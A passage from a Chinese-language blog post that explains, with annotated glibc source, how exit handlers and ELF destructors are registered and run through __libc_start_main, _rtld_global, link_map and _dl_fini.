=</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">l</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">r</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock(lock); <span class="comment">//上锁</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//寻找一个析构函数类型为ef_free的位置</span></span><br><span class="line">  <span class="keyword">for</span> (l = *listp; l != <span class="literal">NULL</span>; p = l, l = l-&gt;next) <span class="comment">//遍历链表，l指向当前节点, p指向l的前一个节点</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = l-&gt;idx; i &gt; <span class="number">0</span>; --i)           <span class="comment">//搜索l中的函数指针数组fns[32]</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;fns[i - <span class="number">1</span>].flavor != ef_free) <span class="comment">//有一个不是ef_free的就停止</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) <span class="comment">//在l中找到了, 停止链表遍历</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 只有全部都是ef_free才能走到这里 */</span></span><br><span class="line">    l-&gt;idx = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (l == <span class="literal">NULL</span> || i == <span class="keyword">sizeof</span>(l-&gt;fns) / <span class="keyword">sizeof</span>(l-&gt;fns[<span class="number">0</span>])) <span class="comment">//没有找到空闲位置</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    l==null 说明整个__exit_funcs中都没有ef_free</span></span><br><span class="line"><span class="comment">    i == sizeof(l-&gt;fns) / sizeof(l-&gt;fns[0]) 说明对于l节点, fns已经全部遍历了, 都没找到ef_free</span></span><br><span class="line"><span class="comment">    此时就需要插入一个新的exit_function_list节点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      assert(l != <span class="literal">NULL</span>);</span><br><span class="line">      p = (<span class="keyword">struct</span> exit_function_list *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> exit_function_list)); <span class="comment">//申请一个结构体, p指向新节点</span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)  <span class="comment">//分配失败</span></span><br><span class="line">      &#123;</span><br><span class="line">        p-&gt;next = *listp; <span class="comment">//头插法, 再__exit_funcs中插入一个节点</span></span><br><span class="line">        *listp = p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)  <span class="comment">//分配成功</span></span><br><span class="line">    &#123;</span><br><span class="line">      r = &amp;p-&gt;fns[<span class="number">0</span>]; <span class="comment">//r指向新节点的第一个析构函数描述结构体</span></span><br><span class="line">      p-&gt;idx = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//找到空闲位置了, l节点中第i个为ef_free</span></span><br><span class="line">  &#123;</span><br><span class="line">    r = &amp;l-&gt;fns[i];</span><br><span class="line">    l-&gt;idx = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 此时这个函数位置的类型从空闲(ef_free)变为使用中(ef_us), 等待写入函数指针 */</span></span><br><span class="line">  <span class="keyword">if</span> (r != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    r-&gt;flavor = ef_us;</span><br><span class="line">    ++__new_exitfn_called;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock(lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="析构函数的注册—-libc-start-main"><a href="#析构函数的注册—-libc-start-main" class="headerlink" title="析构函数的注册—__libc_start_main()"></a>析构函数的注册—__libc_start_main()</h2><p><strong>__libc_start_main()</strong>函数初窥</p><ul><li>首先是其参数列表也就是_start()传递的参数, 我们中重点注意下面三个<ul><li>init: ELF文件 也就是main()的构造函数</li><li>fini: ELF文件 也就是main()的析构函数</li><li>rtld_fini: 动态链接器的析构函数</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __libc_start_main(</span><br><span class="line">                <span class="type">int</span> (*main)(<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **MAIN_AUXVEC_DECL), <span class="comment">//参数: main函数指针</span></span><br><span class="line">                <span class="type">int</span> argc, <span class="type">char</span> **argv,                              <span class="comment">//参数: argc argv</span></span><br><span class="line">                ElfW(<span class="type">auxv_t</span>) * auxvec,</span><br><span class="line">                __typeof(main) init,     <span class="comment">//参数: init ELF的构造函数</span></span><br><span class="line">                <span class="type">void</span> (*fini)(<span class="type">void</span>),      <span class="comment">//参数: fini ELF的析构函数</span></span><br><span class="line">                <span class="type">void</span> (*rtld_fini)(<span class="type">void</span>), <span class="comment">//参数: rtld_fini ld的析构函数</span></span><br><span class="line">                <span class="type">void</span> *stack_end         <span class="comment">//参数: 栈顶</span></span><br><span class="line">        )</span><br><span class="line">&#123;</span><br><span class="line">    ...函数体;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入函数体, __libc_start_mian()主要做了以下几件事</p><ul><li>为libc保存一些关于main的参数, 比如__environ…</li><li>通过atexit()注册fini 与 rtld_fini 这两个参数</li><li>调用init为main()进行构造操作</li><li>然后调用main()函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __libc_start_main(...)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 保存main的返回地址 */</span></span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获取环境变量指针, 并保存到libc的.data中</span></span><br><span class="line">  <span class="type">char</span> **ev = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line">  __environ = ev;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 保存下栈顶 */</span></span><br><span class="line">  __libc_stack_end = stack_end;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化TLS */</span></span><br><span class="line">  __pthread_initialize_minimal();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置stack guard */</span></span><br><span class="line">  <span class="type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard(_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置pointer gurad */</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_chk_guard = _dl_setup_pointer_guard(_dl_random, stack_chk_guard);</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 注册动态链接器(ld.so.2)的析构函数  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely(rtld_fini != <span class="literal">NULL</span>))</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 进行一些简单的libc初始化工作: 在libc中保存argc argv env三个参数 */</span></span><br><span class="line">  __libc_init_first(argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 注册ELF的fini函数  */</span></span><br><span class="line">  <span class="keyword">if</span> (fini)</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果ELF有构造函数的话, 那么先调用init() */</span></span><br><span class="line">  <span class="keyword">if</span> (init)</span><br><span class="line">    (*init)(argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 调用main()  */</span></span><br><span class="line">  result = main(argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果main()返回后, __libc_start_main()回帮他调用exit()函数 */</span></span><br><span class="line">  <span class="built_in">exit</span>(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此我们知道libc_start_mian()会在exit_funcs中放入下面两个函数</p><p><strong>ELF的fini函数</strong>和<strong>ld的rtld_fini函数</strong></p><p>然后会调用一个构造函数:</p><p><strong>init()</strong></p><h3 id="ELF的fini"><a href="#ELF的fini" class="headerlink" title="ELF的fini()"></a>ELF的fini()</h3><p>被编译在elf的text段中, 由_start()传递地址给__libc_start_main()</p><p>发现其是一个空函数,因为其只有在静态编译下才会起作用,故而动态编译该函数为空</p><p>静态编译时:该函数会逐一取出fini_array数组中的函数指针执行，该函数指针数组位于bss段上</p><h3 id="ELF的init"><a href="#ELF的init" class="headerlink" title="ELF的init()"></a><strong>ELF的init()</strong></h3><p>让我们思考一个问题: 如果只有fini与init的话, ELF只能有一个构造/ 析构函数</p><p>当具有多个构造析构函数时改怎么办呢?</p><p>ELF的解决方法是, 把所有的构造函数的指针放在一个段: .init_array中, 所有的析构函数的指针放在一个段 .fini_array中</p><p><strong>init()就负责遍历.init_array, 并调用其中的构造函数, 从而完成多个构造函数的调用</strong></p><h3 id="ld的rtdl-fini"><a href="#ld的rtdl-fini" class="headerlink" title="ld的rtdl_fini()"></a>ld的rtdl_fini()</h3><p>我们说完了.init_array, 那么对于.fini_array呢?</p><p>很明显不是ELF的fini()负责 , 因为他就是一个空函数, 那么就只能<u>由rtdl_fini来负责</u></p><p><strong><em>rtdl_fini实际指向_dl_fini()函数</em></strong>, 源码在dl-fini.c文件中, 会被编译到ld.so.2中</p><p>我们把进程空间中的一个单独文件, 称之为模块</p><p>ld.so.2会通过dl_open()把所需文件到进程空间中, 他会把所有映射的文件都记录在结构体_rtld_global中</p><p>当一个进程终止, ld.so.2自然需要卸载所映射的模块, 这需要调用每一个非共享模块的fini_arrary段中的析构函数</p><p><strong>一言以蔽之: _dl_fini()的功能就是调用进程空间中所有模块的析构函数</strong></p><h3 id="rtld-global结构体"><a href="#rtld-global结构体" class="headerlink" title="rtld_global结构体"></a>rtld_global结构体</h3><p>接着来看_rtld_global结构体, 这个结构体很复杂, 我们只看与本文相关的</p><p>_rtld_global一般通过宏GL来引用, 这个结构体定义在ld.so.2的data段中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_global</span> __<span class="title">rtld_global_attribute__</span>;</span></span><br></pre></td></tr></table></figure><ul><li>再看其结构体struct rtld_global的定义<ul><li>一些缩写的含义:<ul><li>ns代表着NameSpace</li><li>nns代表着Num of NameSpace</li></ul></li><li>struct rtld_global先以命名空间为单位建立了一个数组 _dl_ns[DL_NNS]</li><li>在每个命名空间内部加载的模块以双向链表组织, 通过_ns_loaded索引</li><li>同时每个命名空间内部又有一个符号表_ns_unique_sym_table, 记录着所有模块导出的符号集合</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">//每个模块用_ns_loaded描述, 这个命名空间中所映射的模块组成一个双向链表, _ns_loaded就是这个链表的指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* _ns_loaded中有多少模块 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 映射模块的搜索表 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *_<span class="title">ns_main_searchlist</span>;</span></span><br><span class="line">        <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">        <span class="type">size_t</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 这个命名空间中的符号表, 单个命名空间中的符号不允许重复 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym_table</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            __rtld_lock_define_recursive(, lock) <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="type">uint32_t</span> hashval;           <span class="comment">//符号hash值</span></span><br><span class="line">                <span class="type">const</span> <span class="type">char</span> *name;           <span class="comment">//名称</span></span><br><span class="line">                <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> * sym;      <span class="comment">//符号</span></span><br><span class="line">                <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span> <span class="comment">//所属模块</span></span><br><span class="line">            &#125; * entries;                   <span class="comment">//entries可以理解为struct unique_sym数组的指针, 通过entries[idx]就可找到第idx个符号</span></span><br><span class="line">            <span class="type">size_t</span> size;                   <span class="comment">//有多少个元素</span></span><br><span class="line">            <span class="type">size_t</span> n_elements;</span><br><span class="line">            <span class="type">void</span> (*<span class="built_in">free</span>)(<span class="type">void</span> *); <span class="comment">//析构函数</span></span><br><span class="line">        &#125; _ns_unique_sym_table;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 记录命名空间变化的, debug用 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span> _<span class="title">ns_debug</span>;</span></span><br><span class="line">    &#125; _dl_ns[DL_NNS]; <span class="comment">//一个命名空间一个link_namespace结构体</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* _dl_nns表示使用了多少个命名空间: Dynamic Link Num of NameSpace */</span></span><br><span class="line">    <span class="type">size_t</span> _dl_nns;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们分析下struct link_map, 来看看ld是怎么描述每一个模块的</p><ul><li>ELF文件都是通过节的组织的, ld自然也延续了这样的思路,</li><li>l_info中的指针都指向ELF中Dyn节中的描述符, Dyn中节描述符类型是ElfW(Dyn)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   ElfW(Addr) l_addr;                <span class="comment">/* 模块在内存中的的基地址 */</span></span><br><span class="line">   <span class="type">char</span> *l_name;                     <span class="comment">/* 模块的文件名  */</span></span><br><span class="line">   ElfW(Dyn) * l_ld;                 <span class="comment">/* 指向ELF中的Dynamic节 */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* 双向链表指针 */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 这个模块所属NameSapce的idx  */</span></span><br><span class="line">   Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">      l_info是ELF节描述符组成的的数组</span></span><br><span class="line"><span class="comment">      ELF中一个节, 使用一个ElfW(Dyn)描述</span></span><br><span class="line"><span class="comment">      各个类型的节在l_info中的下标固定, 因此可以通过下标来区分节的类型</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   ElfW(Dyn) * l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line"></span><br><span class="line">   <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> * l_phdr; <span class="comment">/* ELF的头表  */</span></span><br><span class="line">   ElfW(Addr) l_entry;        <span class="comment">/* ELF入口点  */</span></span><br><span class="line">   ElfW(Half) l_phnum;        <span class="comment">/* 头表中有多少节  */</span></span><br><span class="line">   ElfW(Half) l_ldnum;        <span class="comment">/* dynamic节中有多少描述符  */</span></span><br><span class="line"></span><br><span class="line">    ...;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ElfW(Dyn)是一个节描述符类型(也就是一个宏), 宏展开结果为<strong>Elf64_Dyn</strong>, 这个类型被定义在elf.h文件中, 与ELF中的节描述对应</p><p>这个结构体在elf的学习中很重要</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Sxword    d_tag;            <span class="comment">/* 便签, 用于标注描述符类型,每一个描述符类型都对应一个类型 */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span>        </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Xword d_val;        <span class="comment">/* 内容可以是一个值 */</span></span><br><span class="line">  Elf64_Addr d_ptr;            <span class="comment">/* 也可以是一个指针 */</span></span><br><span class="line">&#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>至此rtld_global的结构就清楚了, 他自顶向下按照: <strong>命名空间-&gt;模块-&gt;节</strong> 的形式<u>描述所有的模块,</u> 通过_ns_unique_sym_table描述命名空间中所有的可见符号</p><h2 id="dl-fini-源码分析"><a href="#dl-fini-源码分析" class="headerlink" title="_dl_fini()源码分析"></a>_dl_fini()源码分析</h2><p>理解了模块是如何组织的之后, _dl_fini的任务就显而易见了:</p><ul><li>遍历rtld_global中所有的命名空间</li><li>遍历命名空间中所有的模块</li><li><strong>找到这个模块的fini_array段, 并调用其中的所有函数指针</strong></li><li><strong>找到这个模块的fini段, 调用fini()</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> internal_function _dl_fini(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) <span class="comment">//遍历_rtld_global中的所有非共享模块: _dl_ns[DL_NNS]</span></span><br><span class="line">    &#123;</span><br><span class="line">        __rtld_lock_lock_recursive(GL(dl_load_lock)); <span class="comment">//对rtld_global上锁</span></span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">        <span class="comment">/* 如果这个NameSapce没加载模块, 或者不需要释放, 就不需要做任何事, 就直接调用rtld中的函数指针释放锁 */</span></span><br><span class="line">        <span class="keyword">if</span> (nloaded == <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit)</span><br><span class="line">            __rtld_lock_unlock_recursive(GL(dl_load_lock));</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//否则遍历模块</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* 把这个命名空间中的所有模块指针, 都复制到maps数组中  */</span></span><br><span class="line">            <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">            assert(nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next) <span class="comment">//遍历链表</span></span><br><span class="line">                <span class="keyword">if</span> (l == l-&gt;l_real)                                                <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">                &#123;</span><br><span class="line">                    assert(i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">                    maps[i] = l;</span><br><span class="line">                    l-&gt;l_idx = i;</span><br><span class="line">                    ++i;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Bump l_direct_opencount of all objects so that they are not dlclose()ed from underneath us.  */</span></span><br><span class="line">                    ++l-&gt;l_direct_opencount;</span><br><span class="line">                &#125;</span><br><span class="line">            ...;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;    <span class="comment">//多少个模块</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 对maps进行排序, 确定析构顺序 */</span></span><br><span class="line">            _dl_sort_fini(maps, nmaps, <span class="literal">NULL</span>, ns);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//释放锁</span></span><br><span class="line">            __rtld_lock_unlock_recursive(GL(dl_load_lock));    </span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 从前往后, 析构maps中的每一个模块 */</span></span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">                    l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* 是否包含fini_array节, 或者fini节 */</span></span><br><span class="line">                    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span> || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">/* debug时打印下相关信息 */</span></span><br><span class="line">                        <span class="keyword">if</span> (__builtin_expect(GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">                            _dl_debug_printf(<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,DSO_FILENAME(l-&gt;l_name),ns);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* 如果有fini_array节的话 */</span></span><br><span class="line">                        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                                l-&gt;l_addr: 模块l的加载基地址</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAY]: 模块l中fini_array节的描述符</span></span><br><span class="line"><span class="comment">                                